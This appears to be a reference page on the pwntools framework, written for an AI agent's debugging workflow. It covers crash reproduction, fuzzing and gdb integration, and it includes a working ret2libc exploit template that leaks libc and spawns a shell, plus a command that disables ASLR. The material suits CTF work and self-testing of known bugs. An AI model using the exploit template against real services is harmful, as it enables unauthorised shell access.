# pwntools — Scripted Binary / Network Interaction

**https://docs.pwntools.com/en/stable/ · https://github.com/Gallopsled/pwntools**

pwntools is a Python framework for building reproducible interactions with binaries and network services. Built for CTF exploitation, it is the right tool whenever you need a crafted input sent to a binary or service repeatably, a failing-test equivalent for a byte-level-input bug, a fuzz harness, an exploit PoC, or anything where `echo ... | ./binary` runs out of control. Run scripts through `run_command`; a session that hands you a shell (`p.interactive()`) is a long-running command read with `command_status` and driven with `send_command_input`.

Use pwntools for Phase 5 reproduction of binary bugs and Phase 7 tests against binaries.

---

## Install

```bash
pip install pwntools
# Or in a venv:
python -m venv .venv && source .venv/bin/activate
pip install pwntools

python -c 'from pwn import *; print("ok")'
```

Some Linux distros need build deps: `apt install python3-dev libssl-dev`.

---

## The core API in five idioms

### 1. Process / Remote — one interface

```python
from pwn import *

p = process('./target')                       # local process
p = remote('example.com', 1337)               # remote service
shell = ssh('user', 'host', password='...')   # SSH tunnel to a remote process
p = shell.process('./target', cwd='/tmp')
# The same methods work on all of these — that is the value.
```

### 2. I/O — the five methods you need

```python
p.send(b'data')
p.sendline(b'data')                  # send + \n
p.recv(n)                            # receive up to n bytes
p.recvuntil(b'> ')                   # receive until a pattern (blocks)
p.recvline()                         # receive until \n
p.interactive()                      # hand control to your terminal (manual exploration)

p.sendlineafter(b'prompt> ', b'payload')
p.sendafter(b'key:', key)
```

Timeouts:

```python
try:
    data = p.recvuntil(b'done', timeout=5)
except EOFError:
    print('process died')
except TimeoutError:
    print('no response in 5s')
```

### 3. context — set arch/OS once, the tools align

```python
context.binary = elf = ELF('./target')   # auto-sets arch/os/endianness
# or explicitly:
context.update(arch='amd64', os='linux', endian='little', bits=64)
```

After context is set, `asm()`, `disasm()`, `cyclic()` and `ROP()` produce correct output for that target automatically.

### 4. ELF — parse without hand reverse-engineering

```python
elf = ELF('./target')
elf.symbols['main']
elf.plt['printf']
elf.got['printf']
elf.address = 0x555555554000         # set the base for PIE binaries
elf.search(b'/bin/sh')
elf.functions['main'].address
list(elf.functions)[:10]

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.symbols['system']
```

### 5. cyclic — find offsets without counting

```python
p = process('./target')
p.sendline(cyclic(256))              # a De Bruijn pattern
# crash occurs; note the crash value, e.g. RIP = 0x6161616c
offset = cyclic_find(0x6161616c)     # returns the offset into the pattern
```

Saves an hour of "pad by N bytes then check".

---

## Logging during debug

```python
context.log_level = 'debug'          # very verbose — shows sent/received bytes
context.log_level = 'info'           # default
context.log_level = 'warning'        # quiet

log.info('Connected to target')
log.success('Passed the check')
log.failure('Canary corrupted')
log.progress('brute-forcing').status('attempt %d' % i)
```

---

## Typical debug-session patterns

### Reproduce a crash with a specific input

```python
# debug-repro.py — run: python3 -I debug-repro.py
from pwn import *
context.binary = './target'
p = process('./target')
p.sendlineafter(b'> ', b'<bad input that crashes>')
p.wait()
assert p.poll() is not None and p.poll() != 0, 'expected a crash, got a clean exit'
log.success(f'confirmed crash (exit {p.poll()})')
```

Journal the script path; it is your red test.

### Fuzz harness for a suspected input class

```python
# debug-fuzz.py
from pwn import *
import random
context.binary = './target'
context.log_level = 'warning'
crashes = []
for i in range(1000):
    payload = bytes(random.randint(0, 255) for _ in range(random.randint(1, 100)))
    p = process('./target')
    p.sendline(payload)
    p.wait()
    if p.poll() is not None and p.poll() < 0:   # crashed by a signal
        crashes.append((payload, p.poll()))
        log.success(f'iter {i}: crash sig={-p.poll()}')
open('/tmp/debug-crashes.txt', 'w').write(repr(crashes))
log.info(f'found {len(crashes)} crashes')
```

### Automated exploit harness (CTF or self-testing a known CVE)

```python
from pwn import *
context.binary = elf = ELF('./target')
libc = elf.libc or ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./target')

# Leak
p.sendline(b'A' * 64 + p64(elf.plt['puts']) + p64(elf.symbols['main']) + p64(elf.got['puts']))
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

# Exploit
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))
p.sendline(b'A' * 64 + rop.chain())
p.interactive()
```

---

## Integration with gdb / pwndbg

```python
p = gdb.debug('./target', gdbscript='''
    break main
    continue
''')

# Or attach to a running pwntools-launched process:
p = process('./target')
gdb.attach(p, gdbscript='break *0x401234')
p.sendline(b'trigger input')
```

This is the best way to debug a specific crash repeatably: pwntools drives the input, gdb/pwndbg observes the runtime state.

---

## Gotchas

- **Python version**: pwntools supports Python 3.8+. Very old distros may lack it.
- **`p.interactive()` blocks.** It is for manual exploration; remove it from automated scripts.
- **ASLR on local runs**: turn it off for reproducibility while debugging (`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`), and journal it so you can restore it.
- **`gdb.debug()` needs `gdb-multiarch`** for cross-arch binaries.
- **Subprocess cleanup**: a crashed script may leave orphan `./target` processes; stop them at Phase 9 or add `atexit` cleanup.

---

## Phase 9 cleanup specifics

```bash
rm -f /tmp/debug-*.py
rm -f /tmp/debug-crashes.txt
pkill -f './target' || true     # adjust to the real binary name
# Restore ASLR if disabled:
# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
# Revert any binary patches applied for testing (see native-binary.md).
```
